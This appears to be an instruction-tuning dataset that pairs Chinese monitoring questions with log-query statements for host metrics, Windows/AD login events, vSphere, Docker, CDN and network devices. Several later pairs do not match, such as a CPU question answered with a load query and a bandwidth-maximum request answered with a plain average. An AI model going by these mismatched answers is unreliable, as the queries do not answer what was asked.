{"input": "192.168.1.253按5m_负载趋势图", "instruction": "Linux主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_system_stats  AND 192.168.1.253\n\t| bucket timestamp span=15m as ts \n\t| stats avg(json.Load.load5) as _load by ts,ip\n\t| eval load=\"5m\" \n\t| eval _load = format(\"%.2f\",_load)"}
{"input": "192.168.1.253按1m_负载趋势图", "instruction": "Linux主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_system_stats AND 192.168.1.253\n\t| bucket timestamp span=15m as ts \n\t| stats avg(json.Load.load1) as _load by ts,ip\n\t| eval load=\"1m\" \n\t| eval _load = format(\"%.2f\",_load)"}
{"input": "192.168.1.253按15m_负载趋势图", "instruction": "Linux主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_system_stats AND 192.168.1.253\n\t| bucket timestamp span=15m as ts \n\t| stats avg(json.Load.load15) as _load by ts,ip\n\t| eval load=\"15m\" \n\t| eval _load = format(\"%.2f\",_load)"}
{"input": "每15分钟统计192.168.1.253网卡入口流量图", "instruction": "Linux主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_system_stats AND 192.168.1.253 | bucket timestamp span=15m as ts | stats avg(json.nets.eth0.bytes_recv) as _recv by ts,ip | eval hour=formatdate(ts,\"HH:mm\") | eval eth_bytes_recv=format(\"%.2f\",_recv)"}
{"input": "每15分钟统计192.168.1.253网卡出口流量图", "instruction": "Linux主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_system_stats AND 192.168.1.253| bucket timestamp span=15m as ts | stats avg(json.nets.eth0.bytes_sent) as _sent by ts,ip | eval hour=formatdate(ts,\"HH:mm\") | eval eth_bytes_sent=format(\"%.2f\",_sent) "}
{"input": "每15分钟统计192.168.1.253网卡入口流量图", "instruction": "Windows主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_win_system_stats AND 192.168.1.253 | bucket timestamp span=15m as ts | stats avg('json.nets.本地连接.bytes_recv') as _recv by ts,ip | eval hour=formatdate(ts,\"HH:mm\") | eval eth_bytes_recv=format(\"%.2f\",_recv)"}
{"input": "每15分钟统计192.168.1.253网卡出口流量图", "instruction": "Windows主机运维监控指标数据，编写查询语句实现如下分析场景", "output": "appname:top_info_win_system_stats AND 192.168.1.253 | bucket timestamp span=15m as ts | stats avg('json.nets.本地连接.bytes_sent') as _sent by ts,ip | eval hour=formatdate(ts,\"HH:mm\") | eval eth_bytes_sent=format(\"%.2f\",_sent)"}
{"input": "每10分钟统计windows登录失败用户登录趋势(用户名 administrator)", "instruction": "windows日志数据，编写查询语句实现如下分析场景", "output": "appname:windows json.event_name:登录失败* json.source_name:Microsoft-Windows-Security-Auditing AND json.username:administrator\n|bucket timestamp span=10m as ts|stats count() as count_ by ts,json.username"}
{"input": "每10分钟统计AD登陆成功失败趋势", "instruction": "Windows_AD数据，编写查询语句实现如下分析场景", "output": "appname:windows (json.event_id:4625 OR json.event_id:4624 )NOT (json.username:*$ OR json.username:SYSTEM)|bucket timestamp span=10m as ts |stats count() as cnt by ts,json.message.event"}
{"input": "按每小时分桶统计esxi_datacenter存储使用率趋势", "instruction": "VMware_Esxi监控数据，编写查询语句实现如下分析场景", "output": "appname:vsphere tag:app2 json.fstype:VMFS  |bucket timestamp span=1h as ts | stats count() by ts,json.name,json.capacity.used.pct|eval result=format(\"%.3f\",todouble(json.capacity.used.pct))| fields ts,json.name,result | dedup ts,json.name"}
{"input": "按每小时分桶统计esxi_datacenter存储使用率趋势", "instruction": "主中心Esxi监控数据，编写查询语句实现如下分析场景", "output": "appname:vsphere tag:dmz_master json.fstype:VMFS  |bucket timestamp span=1h as ts | stats count() by ts,json.name,json.capacity.used.pct|eval result=format(\"%.3f\",todouble(json.capacity.used.pct))| fields ts,json.name,result | dedup ts,json.name"}
{"input": "按每小时分桶统计esxi_datacenter存储使用率趋势", "instruction": "Esxi性能监控数据，编写查询语句实现如下分析场景", "output": "appname:vsphere tag:dmz_backup json.fstype:VMFS  |bucket timestamp span=1h as ts | stats count() by ts,json.name,json.capacity.used.pct|eval result=format(\"%.3f\",todouble(json.capacity.used.pct))| fields ts,json.name,result | dedup ts,json.name"}
{"input": "按每小时分桶统计各类事件趋势", "instruction": "Windows_AD数据，编写查询语句实现如下分析场景", "output": "appname:windows| bucket timestamp span=1h as ts  | stats count() as cnt by ts,json.log_name"}
{"input": "按每30分钟分桶统计数据库_mmsql_登录失败用户趋势", "instruction": "数据库_mssql_数据，编写查询语句实现如下分析场景", "output": "appname:windows json.source_name:MSSQLSERVER json.message.event:*登录失败 |bucket timestamp span=30m as ts |stats count() by ts,json.event_data.param1 "}
{"input": "按每30分钟分桶统计AD任务事件趋势图", "instruction": "AD日志数据，编写查询语句实现如下分析场景", "output": "appname:windows tag:security | bucket timestamp span=30m as ts | stats count() by ts, json.message.event"}
{"input": "按每30分钟分桶统计AD目标域名事件趋势图", "instruction": "AD日志数据，编写查询语句实现如下分析场景", "output": "appname:windows tag:security | bucket timestamp span=30m as ts | stats count() by ts, json.event_data.TargetDomainName"}
{"input": "按每30分钟分桶统计AD目标地址事件趋势图", "instruction": "AD日志数据，编写查询语句实现如下分析场景", "output": "appname:windows tag:security | bucket timestamp span=30m as ts | stats count() by ts, json.event_data.DestAddress\t"}
{"input": "按每5分钟分桶统计AD帐户管理详情", "instruction": "AD日志数据，编写查询语句实现如下分析场景", "output": "appname:windows tag:ad  (json.event_id:4720 OR json.event_id:4726 OR json.event_id:4740 OR json.event_id:4726 OR json.event_id:4725)\n| bucket timestamp span=5m as ts \n| eval event_id=json.event_id\n| eval src_user=json.event_data.SubjectUserName\n| eval dest_user=json.event_data.TargetUserName\n| stats count() as ct by ts,src_user,dest_user,event_id\n| eval time=formatdate(ts, \"HH:mm:ss\")\n| eval desc=case(event_id == \"4720\",\"增加帐户\",event_id == \"4726\",\"删除帐户\",event_id == \"4740\",\"锁定帐户\",event_id == \"4767\",\"解锁帐户\",event_id == \"4725\",\"禁用帐户\")\n| fields time,src_user,dest_user,event_id,desc"}
{"input": "192.168.41.113主机最近一天cpu使用率趋势", "instruction": "docker性能数据，编写查询语句实现如下分析场景", "output": "starttime=\"-1d\" appname:docker_metric tag:docker_metric_cpu AND (hostname:* AND ip:\"192.168.41.113\") |bucket timestamp span=10m as ts |eval a=todouble(json.total.pct)| stats count() as cnt by json.total.pct,ts"}
{"input": "192.168.1.141主机最近一天内存占用率趋势", "instruction": "docker性能数据，编写查询语句实现如下分析场景", "output": "starttime=\"-1d\" appname:docker_metric tag:docker_metric_memory AND (hostname:* AND ip:\"192.168.1.141\") |bucket timestamp span=30m as ts| stats count() as cnt by json.usage.pct,ts|eval usagepct=format(\"%f\",json.usage.pct*100)"}
{"input": "192.168.1.141主机最近一天磁盘读写次数趋势", "instruction": "docker性能数据，编写查询语句实现如下分析场景", "output": "starttime=\"-1d\" appname:docker_metric tag:docker_metric_diskio AND (hostname:* AND ip:\"192.168.1.141\") |bucket timestamp span=30m as ts| stats count() as cnt by json.total,ts"}
{"input": "192.168.1.141主机最近一天网络丢包趋势", "instruction": "docker性能数据，编写查询语句实现如下分析场景", "output": "starttime=\"-1d\" appname:docker_metric tag:docker_metric_network AND (hostname:* AND ip:\"192.168.1.141\") |bucket timestamp span=30m as ts| stats count() as cnt by json.in.dropped,json.out.dropped,ts |eval drop=json.in.dropped+json.out.dropped"}
{"input": "administrator账号登录失败次数最多的前 10 个来源IP地址，按小时统计日志量趋势", "instruction": "windows日志数据，编写查询语句实现如下分析场景", "output": "appname:windows json.event_name:登录失败* json.source_name:Microsoft-Windows-Security-Auditing [[appname:windows json.event_name:登录失败* json.source_name:Microsoft-Windows-Security-Auditing AND json.username:administrator |top 10 json.event_data.IpAddress|fields json.event_data.IpAddress]]|bucket timestamp span=1h as ts|stats count() as count_ by ts,json.event_data.IpAddress"}
{"input": "按json.keywords分组，每20分钟统计一次AD账户登录成功失败趋势", "instruction": "AD日志数据，编写查询语句实现如下分析场景", "output": "appname:windows tag:security (json.event_id:4624 OR json.event_id:4625)\n| bucket timestamp span=20m as ts \n| stats count() by ts, json.keywords"}
{"input": "", "instruction": "查询每五分钟内每个 IP 地址的 CPU 使用率平均值小于等于 20% 的时间段？", "output": "appname:top_info_win_system_stats  | bucket timestamp span=5m as ts  | stats avg(json.cpu.idle_percent) as _avg by ip,ts  | where _avg <=20 "}
{"input": "", "instruction": "我想要知道在过去一天内，使用 Docker 智能化运维平台的主机上，内存占用的百分比有哪些变化趋势。", "output": "starttime=\"-1d\" appname:docker_metric tag:docker_metric_memory AND (hostname:* AND ip:\"192.168.1.141\") |bucket timestamp span=30m as ts| stats count() as cnt by json.usage.pct,ts|eval usagepct=format(\"%f\",json.usage.pct*100)"}
{"input": "", "instruction": "我想询问关于192.168.1.253在一小时内每10分钟的内存使用量以及各个时间段的平均值。", "output": "appname:top_info_system_stats AND 192.168.1.253 | bucket timestamp span=10m as ts | stats avg(json.Mem.used_percent) as _mem by ts,ip | eval hour=formatdate(ts,\"HH:mm\") | eval Mem.used_percent=format(\"%.2f\",_mem) | fields ip,hour,Mem.used_percent,ts"}
{"input": "", "instruction": "你能帮我把这个问题翻译成SPL吗？我想知道192.168.1.253每十分钟平均的内存使用率。", "output": "appname:top_info_win_system_stats AND 192.168.1.253| bucket timestamp span=10m as ts | stats avg(json.Mem.used_percent) as _mem by ts,ip | eval hour=formatdate(ts,\"HH:mm\") | eval Mem.used_percent=format(\"%.2f\",_mem) | fields ip,hour,Mem.used_percent,ts"}
{"input": "", "instruction": "我想要知道 CPU 使用情况和主机名以及虚拟机名称。请告诉我每一小时内每个虚拟机的 CPU 使用率和时间。", "output": "appname:vsphere tag:app2 source:VirtualMachine*   |bucket timestamp span=1h as ts |eval time=formatdate(ts,\"HH:mm\")| stats last(json.cpu.used.mhz) as cpu_Mhz by time,json.hostname,json.name | sort by +time"}
{"input": "", "instruction": "寻找有关 vSphere 中 dmz_backup 标记的主机上 CPU 使用情况的统计信息。为了完成这个任务，需要执行以下步骤：1.从 appname:vsphere 和 tag:dmz_backup 两个字段中检索数据。2.将时间戳存储到名为 ts 的新字段中。3.使用 stats 命令计算每个时间段内的 CPU 使用量的分布和数量。4.使用 eval 命令计算每个主机的 CPU 使用率并格式化为三位小数。", "output": "appname:vsphere tag:dmz_backup source:\"HostSystem*\" |bucket timestamp span=1m as ts| stats dc(json.hostname) by ts,json.hostname,json.cpu.total.mhz,json.cpu.free.mhz | eval usage=format(\"%.3f\",(json.cpu.total.mhz-json.cpu.free.mhz)/json.cpu.total.mhz* 100)"}
{"input": "", "instruction": "我在询问关于网络流量统计信息，并希望了解其发送和接收的数据包数量是否超过了每秒五十兆字节。", "output": "appname:top_info_system_stats  | bucket timestamp span=5m as ts  | stats avg(json.nets.eth0.bytes_recv) as _avg by ts,ip | where _avg / (1024 * 1024) > 50 | stats dc(ip) as _dc "}
{"input": "", "instruction": "我想问的是，系统中每个应用的磁盘IO吞吐量平均值分别为多少？并按此排序，取前五个最高的值。", "output": "appname:top_info_disk_io_stats  | bucket timestamp span=5m as ts  | stats avg(json.io_stat.wkB_s) as _avg_w by hostname,json.name  | sort by _avg_w | limit 5 | eval avg_w=format(\"%.2fkB/s\",_avg_w)"}
{"input": "", "instruction": "我想要知道系统的网络流量情况，以及每个 IP 和主机名发送和接收到的平均数据包大小。这些数据应该在五分钟内收集一次，并且只显示每IP地址发送的数据包数量超过 50 MB 的记录。", "output": "appname:top_info_win_system_stats  | bucket timestamp span=5m as ts  | stats avg('json.nets.本地连接.bytes_sent') as _avg by ts,ip,hostname  | where _avg / (1024 * 1024) > 50 | sort by ts  | dedup 1 ip  | eval bytes_sent=format(\"%.2fKB\",_avg/1024)"}
{"input": "", "instruction": "我想要知道我的系统的网络流量情况，你能帮我把这些数据整理成图表吗？我想看一下每小时内的平均带宽和最大带宽。", "output": "appname:top_info_system_stats AND 192.168.1.253 | bucket timestamp span=15m as ts | stats avg(json.nets.eth0.bytes_recv) as _recv by ts,ip | eval hour=formatdate(ts,\"HH:mm\") | eval eth_bytes_recv=format(\"%.2f\",_recv)"}
{"input": "", "instruction": "我想问的是 windows 系统上发生的安全事件数量统计，按时间段分组并将每个时间段内的事件数目打印出来。", "output": "appname:windows tag:security | bucket timestamp span=30m as ts | stats count() by ts, json.message.event"}
{"input": "", "instruction": "我想问的是系统磁盘使用率的平均值，时间为每天，分区为`/`。", "output": "appname:top_info_disk_stats tag:top_info json.disk.path:\"/\" AND * |bucket timestamp span=1d as ts |stats avg(json.disk.used_percent) as avg_per by ts,hostname"}
{"input": "", "instruction": "我想问关于某台服务器的CPU利用率走势，具体信息为：`appname:top_info_system_stats AND 192.168.1.253`。", "output": "appname:top_info_system_stats AND 192.168.1.253| bucket timestamp span=10m as ts | stats avg(json.cpu.system_percent) as count_ by ts "}
{"input": "", "instruction": "vSphere 中应用名为 \"vsphere\"、标签为 \"app2\" 源自 VirtualMachine* 的日志中获取内存使用情况的指标数据，并将其以易于阅读和理解的方式呈现。", "output": "appname:vsphere tag:app2 source:VirtualMachine*  |bucket timestamp span=1h as ts |eval time=formatdate(ts,\"HH:mm\")  |  stats last(json.memory.used.guest.bytes) as memory by time,json.hostname,json.name,json.memory.total.guest.bytes|eval usage=format(\"%.3f\",memory/json.memory.total.guest.bytes * 100)|fields time,json.hostname,json.name,usage|sort by +time"}
{"input": "", "instruction": "我想问有关 vSphere 中 dmz_master 服务的使用情况，并且希望通过分析 CPU 使用率走势来评估主机资源利用效率。", "output": "appname:vsphere tag:dmz_master source:HostSystem_* |bucket timestamp span=1m as ts| stats dc(json.hostname) by ts,json.hostname,json.cpu.total.mhz,json.cpu.free.mhz | eval usage=format(\"%.3f\",(json.cpu.total.mhz-json.cpu.free.mhz)/json.cpu.total.mhz* 100)"}
{"input": "", "instruction": "我想问关于 vSphere 中 dmz_master 服务的主机去重数、内存使用情况和使用百分比的走势。", "output": "appname:vsphere tag:dmz_master source:HostSystem* |bucket timestamp span=1m as ts| stats dc(json.hostname) by ts,json.hostname,json.memory.total.bytes,json.memory.free.bytes | eval use_percent=format(\"%.3f\",(json.memory.total.bytes-json.memory.free.bytes)/json.memory.total.bytes* 100)"}
{"input": "", "instruction": "我想问的是内存使用率高于80%的 IP 去重数，按五分钟粒度统计趋势？", "output": "appname:top_info_system_stats  | bucket timestamp span=5m as ts  | stats avg(json.Mem.used_percent) as _avg by ip,ts  | where _avg >=80  | stats dc(ip) as _dc "}
{"input": "", "instruction": "我想问的是系统的磁盘IO情况，ip地址为192.168.1.253，时间间隔为5分钟", "output": "appname:top_info_disk_io_stats AND 192.168.1.253 | bucket timestamp span=5m as ts | stats avg(json.io_stat.rkB_s) as _avg_r by json.name,ts"}
{"input": "", "instruction": "我想询问关于某台服务器的磁盘I/O使用情况，并希望通过对该服务器进行趋势监视和分析来解决性能问题。", "output": "appname:top_info_disk_io_stats AND 192.168.1.253| bucket timestamp span=5m as ts | stats avg(json.io_stat.wkB_s) as _avg_r by json.name,ts"}
{"input": "", "instruction": "我想知道系统内存使用率高于80%的主机数量分布趋势。", "output": "appname:top_info_win_system_stats  | bucket timestamp span=5m as ts  | stats avg(json.Mem.used_percent) as _avg by ip,ts  | where _avg >=80  | stats dc(ip) as _dc"}
{"input": "", "instruction": "我想问的是系统的网络IO使用率高于50M/s的主机数量？", "output": "appname:top_info_win_system_stats  | bucket timestamp span=5m as ts  | stats avg('json.nets.本地连接.bytes_recv') as _avg by ts,ip | where _avg / (1024 * 1024) > 50  | sort by ts  | stats dc(ip) as _dc "}
{"input": "", "instruction": "我想要知道每五分钟内系统资源利用率低于20%的主机名和IP地址，并按降序排列。请告诉我这些信息。", "output": "appname:top_info_win_system_stats   | bucket timestamp span=5m as ts  | stats avg(json.cpu.idle_percent) as _avg by ts,ip,hostname | where _avg <= 20  | sort by ts  | dedup 1 ip | eval use_percent=format(\"%.2f%%\",100-_avg)  | sort by use_percent"}
{"input": "", "instruction": "我想问的是系统的磁盘IO情况，按五分钟趋势统计，具体是哪个进程占用了太多的IO资源呢？", "output": "appname:top_info_win_disk_io_stats AND 192.168.1.253| bucket timestamp span=5m as ts | stats avg(json.percent_idle_time) as '_avg%' by json.name,ts"}
{"input": "", "instruction": "我想询问各设备的内存使用情况，并且希望通过性能指标进行趋势分析来解决某个问题。", "output": "appname:top_info_system_stats tag:top_info AND * |bucket timestamp span=1d as ts |stats max(json.Mem.used_percent) as max_per by ts,hostname"}
{"input": "", "instruction": "我想问的是 CPU 使用率的平均值走势和 IP 地址之间的关系。", "output": "appname:top_info_system_stats  AND 192.168.1.253 | bucket timestamp span=15m as ts  | stats avg(json.Load.load5) as _load by ts,ip | eval load=\"5m\"  | eval _load = format(\"%.2f\",_load)"}
{"input": "", "instruction": "我想问192.168.1.243在一段时间内的平均负载趋势情况。", "output": "appname:top_info_system_stats AND 192.168.1.243 | bucket timestamp span=15m as ts  | stats avg(json.Load.load1) as _load by ts | eval load=\"1m\"  | eval _load = format(\"%.2f\",_load)"}
{"input": "", "instruction": "我想问有关网络流量统计信息和某个IP地址的情况，具体来说：1. 应用名为“top_info_system_stats”；2. IP地址为`192.168.1.253`。3.  15 分钟统计一次。", "output": "appname:top_info_system_stats AND 192.168.1.253| bucket timestamp span=15m as ts | stats avg(json.nets.eth0.bytes_sent) as _sent by ts,ip | eval hour=formatdate(ts,\"HH:mm\") | eval eth_bytes_sent=format(\"%.2f\",_sent) "}
{"input": "", "instruction": "我想问的是我的电脑的网络状态，我在 Windows 下使用系统自带的资源管理器查看到我的局域网 IP 是 `192.168.1.254`，所以我希望能够看到过去每一小时内该设备发出或接受的数据包数量和大小的信息。", "output": "appname:top_info_win_system_stats AND 192.168.1.254 | bucket timestamp span=15m as ts | stats avg('json.nets.本地连接.bytes_recv') as _recv by ts,ip | eval hour=formatdate(ts,\"HH:mm\") | eval eth_bytes_recv=format(\"%.2f\",_recv)"}
{"input": "", "instruction": "我想要知道192.168.1.253发送流量情况，你能帮我查一下吗？", "output": "appname:top_info_win_system_stats AND 192.168.1.253 | bucket timestamp span=15m as ts | stats avg('json.nets.本地连接.bytes_sent') as _sent by ts,ip | eval hour=formatdate(ts,\"HH:mm\") | eval eth_bytes_sent=format(\"%.2f\",_sent)"}
{"input": "", "instruction": "我想问在处理用户“ administrator ”的 Windows 应用“ windows ”的登录失败事件时，是否需要将时间间隔设置为 10 分钟并按时间分组进行统计。", "output": "appname:windows json.event_name:登录失败* json.source_name:Microsoft-Windows-Security-Auditing AND json.username:administrator|bucket timestamp span=10m as ts|stats count() as count_ by ts,json.username"}
{"input": "", "instruction": "我想要知道我的虚拟机的使用率情况。你能帮我把这些数据整理一下吗？", "output": "appname:vsphere tag:app2 json.fstype:VMFS  |bucket timestamp span=1h as ts | stats count() by ts,json.name,json.capacity.used.pct|eval result=format(\"%.3f\",todouble(json.capacity.used.pct))| fields ts,json.name,result | dedup ts,json.name"}
{"input": "", "instruction": "我想要知道哪些虚拟机正在使用DMZ中的共享存储空间，并且这些虚拟机的磁盘利用率最高的是哪个。", "output": "appname:vsphere tag:dmz_master json.fstype:VMFS  |bucket timestamp span=1h as ts | stats count() by ts,json.name,json.capacity.used.pct|eval result=format(\"%.3f\",todouble(json.capacity.used.pct))| fields ts,json.name,result | dedup ts,json.name"}
{"input": "", "instruction": "我正在寻找 Windows 应用中发生过登录失败事件且来源于 Microsoft-Windows-Security-Auditing 组件的所有记录，并按 IP 地址进行分组统计，时间间隔为一小时的数量分布情况。", "output": "appname:windows json.event_name:登录失败* json.source_name:Microsoft-Windows-Security-Auditing [[appname:windows json.event_name:登录失败* json.source_name:Microsoft-Windows-Security-Auditing AND json.username:administrator |top 10 json.event_data.IpAddress|fields json.event_data.IpAddress]]|bucket timestamp span=1h as ts|stats count() as count_ by ts,json.event_data.IpAddress"}
{"input": "", "instruction": "我想问的是 windows 系统上 security 模块的错误信息数量统计，时间间隔为 20 分钟，根据 event id 为 4624 或 4625 的记录数进行分组和汇总", "output": "appname:windows tag:security (json.event_id:4624 OR json.event_id:4625)| bucket timestamp span=20m as ts | stats count() by ts, json.keywords"}
{"input": "", "instruction": "我想问的是，过去一天内，在容器名中包含“docker”的主机上，有没有发生过网络丢包或者以三十分钟计算平均延迟高于三十毫秒的情况吗？", "output": "starttime=\"-1d\" appname:docker_metric tag:docker_metric_network AND (hostname:* AND ip:\"192.168.1.141\") |bucket timestamp span=30m as ts| stats count() as cnt by json.in.dropped,json.out.dropped,ts |eval drop=json.in.dropped+json.out.dropped"}
{"input": "按每小时分桶统计各类威胁分布占比前 10 名。", "instruction": "长亭NTA数据，编写查询语句实现如下分析需求", "output": "appname:nta tag:chaitin|bucket timestamp span=1h as ts |stats count() by nta.attack_type |limit 10"}
{"input": "非系统操作，按操作类型做每 30 分钟数量趋势统计，只要最后 10 条结果。", "instruction": "思福迪堡垒机数据，编写查询语句实现如下分析场景", "output": "appname:fortress tag:safety  \n\t|bucket timestamp span=30m as ts\n| stats count() as cnt by 'fortress.kv.操作类型',ts\n|sort by cnt|limit 10"}
{"input": "每10分钟统计城市丢包趋势。", "instruction": "机顶盒自助服务系统数据，编写查询语句实现如下分析场景", "output": "appname:stb tag:userreport stb.loss:>0|bucket timestamp span=10m as ts|stats avg(stb.loss) as avg_ by stb.area_code_dec,ts"}
{"input": "每10分钟统计点播卡屏占比趋势_10m。", "instruction": "机顶盒数据，编写查询语句实现如下分析场景", "output": "appname:stb_vixtel_sotthas stb_vixtel_sotthas.hasQoE:>=0 stb_vixtel_sotthas.freezeTime:>=0\nstb_vixtel_sotthas.downloadTime:>=0 \n|bucket timestamp span=10m as ts\n|eval freezeTime=todouble(stb_vixtel_sotthas.freezeTime)\n|eval downloadTime=todouble(stb_vixtel_sotthas.downloadTime)\n|eval freezeRate=(freezeTime/1000000)/downloadTime\n|stats avg(freezeRate) as avg_freezeRate by ts\n|eval avg_freezeRate_1=format(\"%.2f\",avg_freezeRate)"}
{"input": "每10分钟统计直播花屏占比趋势_10m。", "instruction": "机顶盒数据，编写查询语句实现如下分析场景", "output": "appname:stb_vixtel_smpegts (stb_vixtel_smpegts.freezeTime:>0 AND stb_vixtel_smpegts.downloadTime:>0)|bucket timestamp span=10m as ts\n|eval freezeTime=tolong(stb_vixtel_smpegts.freezeTime)|eval downloadTime=tolong(stb_vixtel_smpegts.downloadTime)\n| stats sum(freezeTime) as freezeTime1,sum(downloadTime) as downloadTime1 by ts|eval liveFreezeRate=format(\"%.3f\",(freezeTime1/1000000)/downloadTime1)"}
{"input": "每10分钟统计中间件_nginx_流量趋势。", "instruction": "中间件_nginx_数据，编写查询语句实现如下分析场景", "output": "appname:nginx tag:access|eval value=tolong(middleware.bytes_out) |where middleware.bytes_out != null |bucket timestamp span=10m as ts |stats sum(value) as cn by ts|rename cn as \"流量\""}
{"input": "每10分钟统计WLS活动事务数。", "instruction": "webLogic日志数据，编写查询语句实现如下分析场景", "output": "appname:weblogic|bucket timestamp span=10m as ts | stats dc(middleware.transaction) as '事务吞吐量' by middleware.server, ts"}
{"input": "每10分钟统计活动线程数趋势。", "instruction": "webLogic日志数据，编写查询语句实现如下分析场景", "output": "appname:weblogic|bucket timestamp span=10m as ts|stats dc(middleware.thread) as '活动线程数' by middleware.server, ts"}
{"input": "每10分钟统计中间件_kingdee_流量趋势。", "instruction": "金蝶kingdee数据，编写查询语句实现如下分析场景", "output": "appname:kingdee tag:access|eval value=tolong(middleware.bytes_out) |where middleware.bytes_out != null |bucket timestamp span=10m as ts |stats sum(value) as cn by ts|rename cn as \"流量\""}
{"input": "按每小时分桶统计各任务分类的耗时趋势。", "instruction": "日志易运营视图数据，编写查询语句实现如下分析场景", "output": "appname:frontend_log   (frontend.message.category:search OR frontend.message.category:alert OR frontend.message.category:schedule OR frontend.message.category:report)  | bucket timestamp span=1h as ts |stats avg(frontend.span) as avg_ by frontend.message.category,ts"}
{"input": "按每分钟分桶统计aofei_cdn流量趋势监控。", "instruction": "奥飞CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:aofei |bucket timestamp span=1m as ts |  stats sum(cdn.body_size) by appname,ts"}
{"input": "按每分钟分桶统计aofei_点播业务流量趋势监控。点播域名包括：vod1.video.com,vod2.video.com,vod3.video.com,vod4.video.com。", "instruction": "奥飞CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:aofei AND (cdn.domain:vod1.video.com OR cdn.domain:vod2.video.com OR  cdn.domain:vod3.video.com OR cdn.domain:vod4.video.com)|bucket timestamp span=1m as ts |  stats sum(cdn.body_size) by appname,ts"}
{"input": "按每分钟分桶统计CDN各节点流量趋势监控。", "instruction": "华为CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:huawei  |bucket timestamp span=1m as ts |  stats sum(cdn.body_size) by tag,ts"}
{"input": "按每分钟分桶统计点播业务各节点流量趋势监控。点播域名包括：vod1.video.com,vod2.video.com,vod3.video.com,vod4.video.com。", "instruction": "华为CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:huawei  AND (cdn.domain:vod1.video.com OR cdn.domain:vod2.video.com OR  cdn.domain:vod3.video.com OR cdn.domain:vod4.video.com)|bucket timestamp span=1m as ts |  stats sum(cdn.body_size) by tag,ts"}
{"input": "按每分钟分桶统计图片业务各节点流量趋势监控。图片业务域名包括：wapx.example.cn,img.example.cn,tv.example.cn。", "instruction": "华为CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:huawei AND (cdn.domain:wapx.example.cn OR cdn.domain:img.example.cn OR  cdn.domain:tv.example.cn) |bucket timestamp span=1m as ts |  stats sum(cdn.body_size) by tag,ts"}
{"input": "按每分钟分桶统计小gc没分组总耗时趋势。", "instruction": "jdk_gc数据，编写查询语句实现如下分析场景", "output": "appname:gc AND gc.invocations:*|bucket timestamp span=1m as ts|stats sum(gc.GCREALTIME) as sumtime by ts|eval sumtime=if(empty(sumtime),0,sumtime)|rename sumtime as '总耗时'"}
{"input": "按每分钟分桶统计委托买卖金额趋势。", "instruction": "同花顺数据，编写查询语句实现如下分析场景", "output": "appname:ths THS.REQTYPE:3 THS.ANSTYPE:\" \" | eval money=THS.WTJG*THS.WTSL | bucket timestamp span=1m as ts | stats sum(money) as RMB by ts,THS.MMLB"}
{"input": "按每30分钟分桶统计连接接收字节数趋势。", "instruction": "防火墙_hillstone数据，编写查询语句实现如下分析场景", "output": "appname:firewall AND tag:hillstone AND \"session end\"  firewall.receive_byte:* | bucket timestamp span=30m as ts |eval rcv_=tolong(firewall.receive_byte) |stats sum(rcv_) as rcvbyte by hostname,ts  | rename rcvbyte as \"接收字节数\""}
{"input": "按每30分钟分桶统计连接发送字节数趋势。", "instruction": "防火墙_hillstone数据，编写查询语句实现如下分析场景", "output": "appname:firewall AND tag:hillstone AND \"session end\" firewall.send_byte:*| bucket timestamp span=30m as ts |eval sbyte_=tolong(firewall.send_byte) |stats sum(sbyte_) as sendbyte by hostname,ts  | rename sendbyte as \"发送字节数\""}
{"input": "按每30分钟分桶统计访问ip请求流量趋势。", "instruction": "pf_nginx数据，编写查询语句实现如下分析场景", "output": "appname:pf_nginx nginx.bytes:*|eval bytes=tolong(nginx.bytes)|bucket timestamp span=30m as ts|stats sum(bytes) as ct by ts,nginx.src_ip"}
{"input": "按每30分钟分桶统计The_busiest_half_hour_of_each_lane。", "instruction": "traffic_signal数据，编写查询语句实现如下分析场景", "output": " 'appname':signal|bucket timestamp span=30m as ts |eval time=formatdate(ts,\"HH:mm\") |stats sum(signal.queue_length) as cnt by time,signal.lane_name|sort by signal.lane_name,cnt|dedup 1 signal.lane_name"}
{"input": "按每30分钟分桶统计Average_number_of_half_an_hour_per_lane。", "instruction": "traffic_signal数据，编写查询语句实现如下分析场景", "output": " 'appname':signal|bucket timestamp span=30m as ts |stats avg(signal.queue_length) as cnt by ts,signal.lane_name\t"}
{"input": "按每30分钟分桶统计Vehicle_passing_each_lane_every_day。", "instruction": "traffic_signal数据，编写查询语句实现如下分析场景", "output": " 'appname':signal|bucket timestamp span=30m as ts |eval time=formatdate(ts,\"HH:mm\") |stats sum(signal.queue_length) as cnt by signal.lane_name|sort by cnt"}
{"input": "按每30分钟分桶统计The_busiest_Lane_in_the_same_direction_is_half_an_hour。", "instruction": "traffic_signal数据，编写查询语句实现如下分析场景", "output": " 'appname':signal|bucket timestamp span=30m as ts |eval time=formatdate(ts,\"HH:mm\") |eval lane=tolong(signal.lane_name)|stats sum(signal.queue_length) as cnt by time,lane|sort by lane,cnt|dedup 1 lane"}
{"input": "按每30分钟分桶统计Average_number_of_vehicles_per_half_hour_in_the_same_direction。", "instruction": "traffic_signal数据，编写查询语句实现如下分析场景", "output": " 'appname':signal|bucket timestamp span=30m as ts |eval lane=tolong(signal.lane_name)|stats avg(signal.queue_length) as cnt by ts,lane"}
{"input": "按每30分钟分桶统计Daily_traffic_in_each_direction。", "instruction": "traffic_signal数据，编写查询语句实现如下分析场景", "output": " 'appname':signal|bucket timestamp span=30m as ts |eval lane=tolong(signal.lane_name)|stats sum(signal.queue_length) as cnt by lane|sort by cnt"}
{"input": "按每30分钟分桶统计登录登出趋势。", "instruction": "vpn_softether数据，编写查询语句实现如下分析场景", "output": "appname:vpn tag:softether vpn.action:* |bucket timestamp span=30m as ts | eval time=formatdate(timestamp,\"HH:mm\") | stats dc(time) as cnt by vpn.action,ts"}
{"input": "按每30分钟分桶统计登入登出成功失败趋势。", "instruction": "vpn_softether数据，编写查询语句实现如下分析场景", "output": "appname:vpn tag:softether vpn.action:* |bucket timestamp span=30m as ts | eval time=formatdate(timestamp,\"HH:mm\") | stats dc(time) as cnt by vpn.result,ts"}
